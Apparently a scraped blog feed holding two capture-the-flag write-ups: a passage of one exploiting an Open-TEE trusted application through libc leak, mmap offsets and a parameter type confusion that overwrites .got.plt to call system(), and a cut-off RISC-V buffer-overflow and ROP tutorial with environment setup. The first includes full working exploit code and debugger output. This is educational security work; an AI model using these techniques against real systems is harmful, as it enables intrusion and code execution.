operation.params[2].value.a = 0x133; printf(\u0026#34;invoking command sign_class_student: \\n\u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, sign_class_student, \u0026amp;operation, null); if (tee_rv != teec_success \u0026amp;\u0026amp; tee_rv != teec_error_security) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); exit(tee_rv); } printf(\u0026#34;res: 0x%x\\n\u0026#34;, tee_rv); dumphex(out_mem.buffer, sizeof(struct signedstudent)); uint64_t libc_leak = *(uint64_t*)((char*)out_mem.buffer+0x20); uint64_t libc_base = libc_leak - 0x174820; uint64_t libc_system = libc_base + 0x50d70; printf(\u0026#34;found libc base: 0x%lx\\n\u0026#34;, libc_base); 7.2 grade_ta.so leak perfect, we have leaked libc! how about the base address of grade_ta.so? we will rely on mmap relativity. when pages are mmaped, the base address of where mmaped pages are allowed to live is the only thing randomized (mmap_base). however, subsequent mmap calls return an address relative to the mmap_base. here is a very simply demonstration of mmap relativity:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #define abs_diff(x,y) ( (x) \u0026gt; (y) ? ( (x)-(y) ) : ( (y)-(x) ) ) int main() { char *addr1 = mmap(null, 4096, prot_read | prot_write, map_private | map_anonymous, -1, 0); char *addr2 = mmap(null, 4096, prot_read | prot_write, map_private | map_anonymous, -1, 0); char *addr3 = mmap(null, 4096, prot_read | prot_write, map_private | map_anonymous, -1, 0); printf(\u0026#34;base mmap addr: 0x%lx\\n\u0026#34;, (uint64_t)addr1); printf(\u0026#34; [*] mmap addr1: 0x%lx\\n\u0026#34;, (uint64_t)addr1); printf(\u0026#34; [*] mmap addr2: 0x%lx\\n\u0026#34;, (uint64_t)addr2); printf(\u0026#34; [*] mmap addr3: 0x%lx\\n\u0026#34;, (uint64_t)addr3); printf(\u0026#34;abs(addr1-addr2) = 0x%lx\\n\u0026#34;, abs_diff(addr1, addr2)); printf(\u0026#34;abs(addr2-addr3) = 0x%lx\\n\u0026#34;, abs_diff(addr2, addr3)); return 0; } as you can see, no matter how many times we run the program, the relative offset between mmaped pages is constant. the base address is always randomized, however subseqeuent mmap calls return an address deterministically relative to the first mmap call.\nwe will take advantage of mmap relativity as the grade_ta.so is actually loaded by an mmap call! the grade_ta.so is not the pie binary itself (/opt/opentee/bin/opentee-engine is the underlying binary in this case). grade_ta.so is loaded with dlopen by the load_ta internal open-tee function. with simple arithmetic, we find out that grade_ta.so is loaded at constant offset 0x228000 from libc.so:\n7.3 write-what-where primitive remember the 1st bug — no check is performed on ta parameter types. this leads to a type confusion vulnerability. what if instead of a memory reference parameter we provide a value paramter when the ta expects a memory reference parameter? here is what happens internally in the open-tee framework with respect to parameters:\n/*! * \\brief copy_tee_operation_to_internal * convert the tee operation into a generic format so that it can be sent to the ta * \\param operation the tee operation format * \\param internal_op the communication protocol format * \\return 0 on success */ static void copy_tee_operation_to_internal(teec_operation *operation, struct com_msg_operation *internal_op) { struct shared_mem_internal *internal_imp; teec_sharedmemory *mem_source; size_t offset; int i; memset(internal_op, 0, sizeof(struct com_msg_operation)); internal_op-\u0026gt;paramtypes = operation-\u0026gt;paramtypes; for_each_param(i) { if (teec_param_type_get(internal_op-\u0026gt;paramtypes, i) == teec_none || teec_param_type_get(internal_op-\u0026gt;paramtypes, i) == teec_value_output) { continue; } else if (teec_param_type_get(internal_op-\u0026gt;paramtypes, i) == teec_value_input || teec_param_type_get(internal_op-\u0026gt;paramtypes, i) == teec_value_inout) { memcpy(\u0026amp;internal_op-\u0026gt;params[i].param.value, \u0026amp;operation-\u0026gt;params[i].value, sizeof(teec_value)); continue; } //... } as expected, the value paramter is copied via a memcpy from the ca to the tee. however, the ta sees a tee_param union structure:\ntypedef union { struct { void* buffer; size_t size; } memref; struct { uint32_t a; uint32_t b; } value; } tee_param; this means that the tee_param.value and tee_param.memref.buffer overlap in memory! under a parameter type confusion bug we can provide a value paramter and the ta will interpret it as a raw 64-bit pointer! the tee_param.memref.size will be zero because of the memset(internal_op, 0, sizeof(struct com_msg_operation)) shown above. with this in mind, we notice that we can control the pointers passed in tee_memmove (e.g. tee_memmove(cursignedstudent,student1,0x10)). the given ta has partial relro and tee_memmove is present in its .got.plt section. with this information we conclude 2 things:\nwe have an arbitrary write since we control both pointers in tee_memove. these pointers have to pass the check tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, ptr, sz). by overwriting the .got.plt section, we can change tee_memmove to point to libc\u0026rsquo;s system. this is useful because can control both the arguments to tee_memmove and their content. we will focus on the sign_student command:\ntvar1 = tee_checkmemoryaccessrights(5,student2,(params-\u0026gt;memref).size); if (tvar1 == tee_success) { tvar1 = tee_checkmemoryaccessrights(5,cursignedstudent,sz); if (tvar1 == tee_success) { tee_memmove(cursignedstudent,student2,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,student2-\u0026gt;lastname,0x10); cursignedstudent-\u0026gt;grade = student2-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = student2-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); //writes 0x10 bytes at cursignedstudent+0x28 return tvar1; } } using a sign_student command, we will use the 2nd tee_memmove shown above to overwrite the tee_memmove@.got.plt to point to system. this can be achieved by doing a type confusion on params[1]. with a subsequent sign_student command, we will invoke tee_memmove(\u0026quot;chmod ugo+r /opt/opentee/flag.txt\u0026quot;) which will actually resolve to system(\u0026quot;chmod ugo+r /opt/opentee/flag.txt\u0026quot;). afterwards, we will be able to dump the flag. here is the exploit for the type confusion:\nstatic void create_64bit_teec_value(teec_value *dest, uint64_t val) { dest-\u0026gt;a = (val \u0026lt;\u0026lt; 32) \u0026gt;\u0026gt; 32; dest-\u0026gt;b = val \u0026gt;\u0026gt; 32; } int main() { // ... uint64_t libc_base = /* ... */; uint64_t libc_system = libc_base + 0x50d70; printf(\u0026#34;found libc base: 0x%lx\\n\u0026#34;, libc_base); printf(\u0026#34; [*] system: 0x%lx\\n\u0026#34;, libc_system); //grade_ta.so is mmaped via dlopen() uint64_t grade_ta_base = libc_base + 0x228000; uint64_t grade_ta_getrandombyte_got_plt = grade_ta_base + 0x4020; printf(\u0026#34;found grade_ta.so base: 0x%lx\\n\u0026#34;, grade_ta_base); printf(\u0026#34; [*] getrandombyte@.got.plt: 0x%lx\\n\u0026#34;, grade_ta_getrandombyte_got_plt); uint64_t ret_0_gadget = grade_ta_base + 0x1284; // xor eax, eax; ret; /* pwndbg\u0026gt; got -p grade_ta.so filtering by lib/objfile path: grade_ta.so filtering out read-only entries (display them with -r or --show-readonly) state of the got of /opt/opentee/lib/tas/grade_ta.so: got protection: partial relro | found 11 got entries passing the filter [0x7fc313278018] tee_checkmemoryaccessrights -\u0026gt; 0x7fc313028d30 (tee_checkmemoryaccessrights) ◂— endbr64 [0x7fc313278020] getrandombyte -\u0026gt; 0x7fc313275260 (getrandombyte) ◂— endbr64 [0x7fc313278028] __stack_chk_fail@glibc_2.4 -\u0026gt; 0x7fc313182360 (__stack_chk_fail) ◂— endbr64 [0x7fc313278030] printf@glibc_2.2.5 -\u0026gt; 0x7fc3130ac6f0 (printf) ◂— endbr64 [0x7fc313278038] tee_memmove -\u0026gt; 0x7fc313028f10 (tee_memmove) ◂— endbr64 [0x7fc313278040] tee_allocateoperation -\u0026gt; 0x7fc3130320b0 (tee_allocateoperation) ◂— endbr64 [0x7fc313278048] __syslog_chk@glibc_2.4 -\u0026gt; 0x7fc31316a2e0 (__syslog_chk) ◂— endbr64 [0x7fc313278050] tee_digestupdate -\u0026gt; 0x7fc31302c190 (tee_digestupdate) ◂— endbr64 [0x7fc313278058] calculate_signature -\u0026gt; 0x7fc313275300 (calculate_signature) ◂— endbr64 [0x7fc313278060] tee_digestdofinal -\u0026gt; 0x7fc31302c280 (tee_digestdofinal) ◂— endbr64 [0x7fc313278068] rand@glibc_2.2.5 -\u0026gt; 0x7fc313092760 (rand) ◂— endbr64 */ //let\u0026#39;s do the arbitrary write memset((void *)\u0026amp;operation, 0, sizeof(operation)); memset(out_mem.buffer, 0, sizeof(struct signedstudent)); operation.paramtypes = teec_param_types( teec_memref_whole, teec_value_input, //type confusion teec_none, teec_none ); operation.params[0].memref.parent = \u0026amp;in_mem; create_64bit_teec_value(\u0026amp;operation.params[1].value, grade_ta_getrandombyte_got_plt); //destination address char *payload = (char*)in_mem.buffer; *(uint64_t*)(payload+0x00) = ret_0_gadget; // getrandombyte *(uint64_t*)(payload+0x08) = ret_0_gadget; // __stack_chk_fail *(uint64_t*)(payload+0x10) = ret_0_gadget; // printf@glibc *(uint64_t*)(payload+0x18) = libc_system; // tee_memmove *(uint64_t*)(payload+0x20) = ret_0_gadget; // tee_allocateoperation //__syslog_chk@glibc will be trashed by calculate_signature() //tee_digestupdate will be trashed by calculate_signature() printf(\u0026#34;invoking command sign_student (overwriting .got.plt): \\n\u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, sign_student, \u0026amp;operation, null); if (tee_rv != teec_success \u0026amp;\u0026amp; tee_rv != teec_error_security) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); exit(tee_rv); } printf(\u0026#34;res: 0x%x\\n\u0026#34;, tee_rv); //now, let\u0026#39;s trigger system() with our command memset((void *)\u0026amp;operation, 0, sizeof(operation)); operation.paramtypes = teec_param_types( teec_memref_whole, teec_memref_whole, // we control the contents of the buffer teec_none, teec_none ); memset(in_mem.buffer, 0, sizeof(struct student)); strcpy(out_mem.buffer, \u0026#34;chmod ugo+r /opt/opentee/flag.txt\u0026#34;); operation.params[0].memref.parent = \u0026amp;in_mem; operation.params[1].memref.parent = \u0026amp;out_mem; printf(\u0026#34;invoking command sign_student (changing flag permissions): \\n\u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, sign_student, \u0026amp;operation, null); if (tee_rv != teec_success \u0026amp;\u0026amp; tee_rv != teec_error_security) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); exit(tee_rv); } printf(\u0026#34;res: 0x%x\\n\u0026#34;, tee_rv); system(\u0026#34;cat /opt/opentee/flag.txt\u0026#34;); return 0; } and we have the flag! thank you for reading 🏴\nepfl{ju5t_4_h4ppy_l1ttl3_typ3_c0nfu510n_8u9}\n","title":"Pwning a TEE Trusted Application - LakeCTF23"},{"date":"2023-05-05","image":"/post-resources/riscv-pwn/risc-v.png","imageAlt":"","link":"https://chalkiadakis.me/posts/hack-a-sat-23/riscv-pwn/","summary":"Setting up a pwntools environment for RISC-V using QEMU and chaining ROP gadgets.","tags":["ctf","environment setup","hack-a-sat","pwn","RISC-V"],"text":"this post is about creating a pwn environment for risc-v, exploiting risc-v binaries, and doing rop chains on risc-v. we will use as our target binary to pwn, the drop-baby binary from hack-a-sat ctf 2023.\nnikos@ctf-box:~$ file drop-baby drop-baby: elf 32-bit lsb executable, ucb risc-v, version 1 (sysv), statically linked, for gnu/linux 5.4.0, with debug_info, not stripped setting up an environment before we can begin diving into exploitation, we need to set up our risc-v pwning environment.\nwe will use qemu to emulate the binary, binfmt for seamless interaction with the binary, gdb-multiarch to debug it, pwntools to programmatically interact with it and write our exploit script, binutils-riscv64-linux-gnu for generating shellcode (assembler), and ropgadget to find rop gadgets in risc-v binaries. since this is cutting edge stuff, it is always recommended to run on the latest version.\nvanilla environment let\u0026rsquo;s start with the vanilla environment, so qemu, binfmt, binutils, and gdb:\nsudo apt update sudo apt-get install -y \\ binutils-riscv64-linux-gnu binutils-doc \\ binfmt-support \\ qemu qemu-utils \\ qemu-user qemu-user-static \\ qemu-system qemu-system-misc \\ gdb-multiarch sudo apt-get install gcc-riscv64-linux-gnu # optional. for using gcc to produce risc-v 64-bit binaries. pip install --upgrade pwntools ropgadget if everything has been done installed correctly, you should now have entries registered in binfmt about risc-v:\nnikos@ctf-box:~$ update-binfmts --display qemu-riscv32 (enabled): package = qemu-user-static type = magic offset = 0 magic = \\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\xf3\\x00 mask = \\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xff\\xff\\xff interpreter = /usr/libexec/qemu-binfmt/riscv32-binfmt-p detector = qemu-riscv64 (enabled): package = qemu-user-static type = magic offset = 0 magic = \\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\xf3\\x00 mask = \\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xff\\xff\\xff interpreter = /usr/libexec/qemu-binfmt/riscv64-binfmt-p detector = and you should also be able to simply run the binary:\nnikos@ctf-box:~$ file drop-baby drop-baby: elf 32-bit lsb executable, ucb risc-v, rvc, double-float abi, version 1 (sysv), statically linked, for gnu/linux 5.4.0, with debug_info, not stripped nikos@ctf-box:~$ ./drop-baby no flag present you should also be able to run the binary under gdb-multiarch:\ngreat!\npwntools environment now, let\u0026rsquo;s make sure that pwntools with gdb also works (by default, in version \u0026lt;4.9.0, they won\u0026rsquo;t). let\u0026rsquo;s make a template pwntools and run it:\n# minimal-template.py # a minimal custom template for binary exploitation that uses pwntools. # run: # python minimal-template.py [debug] [gdb] from pwn import * # set up pwntools for the correct architecture. see `context.binary/arch/bits/endianness` for more context.binary = elfexe = elf(\u0026#39;./drop-baby\u0026#39;) print(context) def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.gdb: return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw) else: target = process([elfexe.path] + argv, *a, **kw) return target # specify your gdb script here for debugging. gdb will be launched the gdb argument is given. gdbscript = \u0026#39;\u0026#39;\u0026#39; # init-gef # continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) arguments = [] io = start(arguments) io.interactive() io.close() nikos@ctf-box:~$ python minimal-template.py [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) traceback (most recent call last): file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 785, in arch defaults = self.architectures[arch] keyerror: \u0026#39;em_riscv\u0026#39; during handling of the above exception, another exception occurred: traceback (most recent call last): file \u0026#34;~/minimal-template.py\u0026#34;, line 8, in \u0026lt;module\u0026gt; context.binary = elfexe = elf(\u0026#39;./drop-baby\u0026#39;) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 176, in fset self._tls[name] = validator(self, val) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 872, in binary self.arch = binary.arch file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 176, in fset self._tls[name] = validator(self, val) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 787, in arch raise attributeerror(\u0026#39;attributeerror: arch must be one of %r\u0026#39; % sorted(self.architectures)) attributeerror: attributeerror: arch must be one of [\u0026#39;aarch64\u0026#39;, \u0026#39;alpha\u0026#39;, \u0026#39;amd64\u0026#39;, \u0026#39;arm\u0026#39;, \u0026#39;avr\u0026#39;, \u0026#39;cris\u0026#39;, \u0026#39;i386\u0026#39;, \u0026#39;ia64\u0026#39;, \u0026#39;m68k\u0026#39;, \u0026#39;mips\u0026#39;, \u0026#39;mips64\u0026#39;, \u0026#39;msp430\u0026#39;, \u0026#39;none\u0026#39;, \u0026#39;powerpc\u0026#39;, \u0026#39;powerpc64\u0026#39;, \u0026#39;riscv\u0026#39;, \u0026#39;s390\u0026#39;, \u0026#39;sparc\u0026#39;, \u0026#39;sparc64\u0026#39;, \u0026#39;thumb\u0026#39;, \u0026#39;vax\u0026#39;] hmm interesting. it seems that the pwnlib library knows about 'riscv' architecture but not about 'em_riscv' (upstream issue here). anyway, we know already that our system can run the binary so let\u0026rsquo;s add a small patch to the ~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/elf/elf.py file of the pwnlib library.\ndiff --git a/elf.py b/elf.py index c6e6708..7f89bd8 100644 --- a/elf.py +++ b/elf.py @@ -481,7 +481,8 @@ class elf(elffile): \u0026#39;em_ppc64\u0026#39;: \u0026#39;powerpc64\u0026#39;, \u0026#39;em_sparc32plus\u0026#39;: \u0026#39;sparc\u0026#39;, \u0026#39;em_sparcv9\u0026#39;: \u0026#39;sparc64\u0026#39;, - \u0026#39;em_ia_64\u0026#39;: \u0026#39;ia64\u0026#39; + \u0026#39;em_ia_64\u0026#39;: \u0026#39;ia64\u0026#39;, + \u0026#39;em_riscv\u0026#39;: \u0026#39;riscv\u0026#39; }.get(self[\u0026#39;e_machine\u0026#39;], self[\u0026#39;e_machine\u0026#39;]) @property let\u0026rsquo;s try running it again now:\nnikos@ctf-box:~$ python minimal-template.py [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) contexttype(arch = \u0026#39;riscv\u0026#39;, binary = elf(\u0026#39;~/drop-baby\u0026#39;), bits = 32, endian = \u0026#39;little\u0026#39;, os = \u0026#39;linux\u0026#39;) [+] starting local process \u0026#39;~/drop-baby\u0026#39;: pid 5541 [*] switching to interactive mode no flag present [*] got eof while reading in interactive $ [*] process \u0026#39;~/drop-baby\u0026#39; stopped with exit code 255 (pid 5541) [*] got eof while sending in interactive great! the binary works with pwntools. let\u0026rsquo;s try pwntools+gdb now:\nnikos@ctf-box:~$ python minimal-template.py gdb [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) contexttype(arch = \u0026#39;riscv\u0026#39;, binary = elf(\u0026#39;~/drop-baby\u0026#39;), bits = 32, endian = \u0026#39;little\u0026#39;, os = \u0026#39;linux\u0026#39;) [!] neither \u0026#39;qemu-riscv\u0026#39; nor \u0026#39;qemu-riscv-static\u0026#39; are available [error] argv must be strings or bytes: [none, \u0026#39;--help\u0026#39;] traceback (most recent call last): file \u0026#34;~/minimal-template.py\u0026#34;, line 26, in \u0026lt;module\u0026gt; io = start(arguments) file \u0026#34;~/minimal-template.py\u0026#34;, line 14, in start return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 1578, in setter return function(*a, **kw) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/gdb.py\u0026#34;, line 539, in debug sysroot = sysroot or qemu.ld_prefix(env=env) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/context/__init__.py\u0026#34;, line 1578, in setter return function(*a, **kw) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/qemu.py\u0026#34;, line 162, in ld_prefix with process([path, \u0026#39;--help\u0026#39;], env=env) as io: file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/tubes/process.py\u0026#34;, line 258, in __init__ executable_val, argv_val, env_val = self._validate(cwd, executable, argv, env) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/tubes/process.py\u0026#34;, line 518, in _validate argv, env = normalize_argv_env(argv, env, self, 4) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/util/misc.py\u0026#34;, line 204, in normalize_argv_env log.error(\u0026#34;argv must be strings or bytes: %r\u0026#34; % argv) file \u0026#34;~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/pwnlib/log.py\u0026#34;, line 439, in error raise pwnlibexception(message % args) pwnlib.exception.pwnlibexception: argv must be strings or bytes: [none, \u0026#39;--help\u0026#39;] from the error message neither 'qemu-riscv' nor 'qemu-riscv-static' are available, it seems that pwntools searches for the qemu-riscv and qemu-riscv-static binaries. let\u0026rsquo;s help it by making them point to qemu-riscv32 and qemu-riscv32-static correspondingly.\nnikos@ctf-box:~$ ln -s /usr/bin/qemu-riscv32 qemu-riscv nikos@ctf-box:~$ ln -s /usr/bin/qemu-riscv32-static qemu-riscv-static nikos@ctf-box:~$ export path=\u0026#34;$path:$(pwd)\u0026#34; nikos@ctf-box:~$ ls drop-baby minimal-template.py qemu-riscv qemu-riscv-static flag.txt let\u0026rsquo;s try again now:\nperfect! our rsic-v pwning environment complete and we can start exploiting (finally)!\nsource code i won\u0026rsquo;t bore you with the reversing of the drop-baby binary. the goal is to get the flag and with that let\u0026rsquo;s jump straight into the buggy code:\nint main() { setvbuf(stdout,null,2,0); char *flag = getenv(\u0026#34;flag\u0026#34;); if (flag == null) { puts(\u0026#34;no flag present\u0026#34;); exit(-1); } //crete flag.txt file. //read and write permissions for the owner of the file, and with no permissions for other users. int flag_fd = open(\u0026#34;flag.txt\u0026#34;, o_creat | o_wronly, 384); if (flag_fd \u0026lt; 0) { printf(\u0026#34;errno = %d trying to open flag.txt\\n\u0026#34;, errno); exit(-1); } size_t svar2 = write(flag_fd,flag,strlen(flag)); if (svar2 != strlen(flag)) { puts(\u0026#34;unable to write flag to file\u0026#34;); exit(-1); } close(flag_fd); //!!! bug: environment variable `flag` does not get wiped from memory. so, even if unsetenv //is invoked, the value of the `flag` environment variable is still somewhere on the stack. if (unsetenv(\u0026#34;flag\u0026#34;) == -1) { puts(\u0026#34;unable to clear environment\u0026#34;); exit(-1); } //setup timeout signal based on `timeout` environment variable. ulong timeout; char *timeout_str = getenv(\u0026#34;timeout\u0026#34;); if (timeout_str == null) { timeout = 10; } else { timeout = strtoul(timeout_str,null,10); if (timeout == 0) { timeout = 10; } } signal(0xe,alarm_handler); //puts(\u0026#34;time\\\u0026#39;s up!\u0026#34;); exit(1); alarm(timeout); puts(\u0026#34;\\nbaby\\\u0026#39;s second risc-v stack smash\\n\u0026#34;); puts(\u0026#34;no free pointers this time and pwning might be more difficult!\u0026#34;); puts(\u0026#34;exploit me!\u0026#34;); do { if (syncronize() == -1) //`synchronize()` expects the following input: `\\xde\\xad\\xbe\\xef` return -1; int res = read_message(); } while (res != -1); return -1; } int read_message(void) { char control_chr; ssize_t nread = read(0,\u0026amp;control_chr,1); if (nread != 1) return -1; //`control_chr` can be one of the following: // \u0026#39;\\xa1\u0026#39;, \u0026#39;\\xa2\u0026#39;, \u0026#39;\\xb1\u0026#39;, \u0026#39;\\xb2\u0026#39; //only \u0026#39;\\xb2\u0026#39; is relevant to us. if (control_chr == \u0026#39;\\xb2\u0026#39;) { return do_b2(); } else { //... } return -1; } int do_b2() { char acstack_78 [100]; if (read(0,acstack_78,sz) \u0026lt; 300) { //!!! bug: bufferoverflow here. return -1; } if (check_message_crc(acstack_78,300) == -1) //dumb crc32 check. last 4 bytes of input is the crc32. return -1; return 0; } here are the juicy parts from the code above:\nthe binary reads two environment variables: flag and timeout. timeout is (classically) used to prevent us from leaving open connections to the remote (nothing fancy). if not specified, it defaults to 10 seconds, so for our exploitation we will set it to something much higher (3600). flag environment variable contains the flag value and writes it to the file flag.txt the unsetenv(\u0026quot;flag\u0026quot;) function simply unsets the environment variable. however, it does not erase the memory. it simply shifts the all the elements in the char *environ[] array to the left by 1 (setenv.c#264). this means that the flag is still somewhere down the stack. syncronize() is a boring state machine. required input is \\xde\\xad\\xbe\\xef. read_message() is where the program will read commands from us. command b2 reads 300 bytes into a buffer of 100 bytes. this is a buffer overflow. now that we have identified the location of the buffer overflow and how to reach it, it is time to come up with a strategy to pwn the binary.\ndetour to risc-v architecture and abi before we attempt to exploit this buffer overflow, we need to understand our target architecture. more specifically:\nwhat is the function call convention? how are arguments passed to functions? how is the control flow transferred to a function how does a function return to its caller what is the syscall abi? how are arguments passed to syscalls how does the stack behave? which are caller/callee saved registers? which are our registers? how does the assembly of risc-v look like? how do we access memory? only if we know the answer to the above questions we can start thinking about exploiting and roping. otherwise, we simply do not know how to control the program counter, how gadgets look like, and how to chain them together!\nregisters all register definitions\ndatatypes function call convention function call convention risc-v has a little-endian memory system. in the standard risc-v calling convention, the stack grows downward and the stack pointer is always kept 16-byte aligned. function arguments are passed arguments in registers when possible. up to eight integer registers, a0-a7 return value is passed in registers a0 and a1. here is a simple example compiled using godbolt.org:\nint myfunc(int arg) { int i; i=arg+0x20; return i; } int main() { myfunc(0x10); return 0; } myfunc(int)-0x2: nop r_riscv_align *abs*+0x2 myfunc(int): addi\tsp,sp,-16\t# allocate stack sw\tra,12(sp)\t# store return address sw\ts0,8(sp)\t# store frame pointer addi\ts0,sp,16\t# s0=sp sw\ta0,-12(s0)\t# save arg0 # do the opration lw\ta0,-12(s0) addi\ta0,a0,0x20 sw\ta0,-16(s0) # return lw\ta0,-16(s0)\t# return value lw\tra,12(sp)\t# return address lw\ts0,8(sp)\t# restore frame pointer addi\tsp,sp,16\t# deallocate stack ret\t# pseudo-instruction: jalr x0, ra, 0 main: addi\tsp,sp,-16 sw\tra,12(sp) sw\ts0,8(sp) addi\ts0,sp,16 li\ta0,0 sw\ta0,-16(s0) sw\ta0,-12(s0) # prepare for function call to myfunc() li\ta0,0x10\t# setup arg1 # compute address of myfunc using relative addressing # and then call it using jalr auipc\tra,0x0 r_riscv_call_plt myfunc(int) r_riscv_relax *abs* jalr\tra\t# 3a \u0026lt;main+0x14\u0026gt; lw\ta0,-16(s0) lw\tra,12(sp) lw\ts0,8(sp) addi\tsp,sp,16 ret other risc-v assembly programmer\u0026rsquo;s manual - very good resource. risc-v instruction set cheatsheet risc-v instruction set reference pseudo-instructions assembler directives relative/absolute addressing, labels, got accessing load \u0026amp; store pwning now that we know our architecture, let\u0026rsquo;s identify the binary\u0026rsquo;s security properties and come up with an exploitation strategy:\nnikos@ctf-box:~$ checksec --file=./drop-baby [*] \u0026#39;~/drop-baby\u0026#39; arch: riscv-32-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x10000) great, no pie!. let\u0026rsquo;s search for useful gadgets using ropgadget. generally, we want to control:\na0,a1,a2,... when making function calls as these are the argument registers ra as this is the return address where a function call should return when finished find jr and jalr gadgets as these will compose our rop chain. also, we notice in the disassembly that many instructions start with the c. prefix. these are compressed 16-bit instructions (rcv) instead of the regular 32-bit instructions and are referred in the \u0026ldquo;c\u0026rdquo; standard extension for compressed instructions in the risc-v isa:\nthe \u0026ldquo;c\u0026rdquo; extension can be added to any of the base isas (rv32,\nrv64, rv128), and we use the generic term “rvc” to cover any of these. typically, 50%–60% of the risc-v instructions in a program can be replaced with rvc instructions, resulting in a 25%–30% code-size reduction.\nrvc uses a simple compression scheme that offers shorter 16-bit versions of common 32-bit risc-v instructions\nthe c extension is compatible with all other standard instruction extensions. the c extension allows 16-bit instructions to be freely intermixed with 32-bit instructions, with the latter now able to start on any 16-bit boundary.\nhere is a one liner to search for gadgets in our binary:\nropgadget --binary drop-baby --align 4 \\ | grep -e \u0026#39;sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall\u0026#39; \\ | grep -e \u0026#39;; (ret)|((c\\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$\u0026#39; \\ | tee gadgets.log the first regex will filter gadgets that have only relevant opcodes to us. the second regex is about how the gadget should end. all of our gadgets will end with either jr or jalr with a register as argument. ret is the same as jalr x0, ra, 0 ret is the same as jr ra if we are doing function calls, we want our gadgets to not end with j(al)?r ra. this is because the function call will use the ra register in the ret instruction to return to our next rop gadget. we are interested in the lwsp gadgets as these gadgets can directly load values from the stack (which we control) into our registers ecall is uses for invoking syscalls, but we have libc statically linked so we don\u0026rsquo;t use it. since our binary supports the c. prefix, we can also --align 2 instead of 4. here are some example good quality gadgets:\n# control a bunch or registers 0x0001a7e8: c.lwsp ra, 0x2c(sp) ; c.lwsp s0, 0x28(sp) ; c.lwsp s1, 0x24(sp) ; c.lwsp s2, 0x20(sp) ; c.lwsp s3, 0x1c(sp) ; c.lwsp s5, 0x14(sp) ; c.lwsp s6, 0x10(sp) ; c.lwsp s7, 0xc(sp) ; c.lwsp s8, 8(sp) ; c.mv a0, s4 ; c.lwsp s4, 0x18(sp) ; c.addi16sp sp, 0x30 ; c.jr ra # control a0, a1, a2 function arguments 0x00026900: c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.mv a5, s8 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s6 ; c.jalr s0 # gadget that does not use `ra` to jump. # instead, it controls `ra`, so we can return from a function call back # to our rop chain. 0x0001a410: c.lwsp ra, 0x1c(sp) ; c.addi16sp sp, 0x20 ; c.jr a5 with the lwsp instructions we can load arbitrary values into registers and with the addi16sp we can increase the stack pointer. the jr and jalr use a register to jump, whcih we we can control with lwsp, and thus we can link gadgets togeather.\nnow for the rop chain payload we have two solutions:\nsolution-cheesy.py - abuses the fact that the flag is still somewhere in the stack. it finds the address of the flag in the stack and then does puts(flag). solution.py - more hardcore rop solution. it performs the following function calls with a rop chain: fd=open(\u0026#34;flag.txt\u0026#34;, o_rdonly); read(fd, buf, 0x100); write(1, buf, 0x100); //write to stdout after each function call, we re-trigger the buffer overflow as the whole rop chain 